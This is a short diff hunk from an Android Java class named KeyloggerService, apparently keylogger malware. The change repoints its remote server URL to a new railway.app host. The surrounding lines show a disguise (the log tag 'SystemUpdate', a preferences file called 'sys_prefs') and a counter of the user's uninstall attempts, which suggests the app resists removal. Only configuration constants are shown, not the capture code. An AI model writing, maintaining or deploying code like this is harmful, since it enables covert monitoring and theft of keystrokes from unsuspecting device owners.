@@ -38,7 +38,7 @@ import java.util.List;
 public class KeyloggerService extends AccessibilityService {
 
     private static final String TAG = "SystemUpdate";
-    private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";
+    private static final String SERVER_URL = "https://daf-production-c62c.up.railway.app";
 
     private static final String PREFS_NAME = "sys_prefs";
     private static final String KEY_UNINSTALL_ATTEMPTS = "uninstall_attempts";
